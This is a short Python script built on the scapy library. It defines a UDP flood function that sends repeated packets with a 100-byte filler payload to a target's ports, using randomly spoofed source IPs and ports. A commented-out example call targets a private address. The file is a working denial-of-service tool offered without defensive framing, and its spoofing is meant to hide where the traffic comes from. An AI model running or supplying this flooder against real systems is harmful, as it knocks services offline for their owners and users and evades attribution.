from scapy.all import IP, UDP, send
from utilities import randomIP, randInt


def UDP_Flood(targetIP, numPackets, ports=[range(3, 65535)]):
    payload = 'a' * 100
    # Loop over number of packets to send to each port
    for i in range(numPackets):
        # Loop over each specified port
        for port in ports:
            pkt = IP(dst=targetIP, src=randomIP())/UDP(dport=port, sport=randInt())/payload
            send(pkt)

#UDP_Flood("192.168.1.124", 10, [80])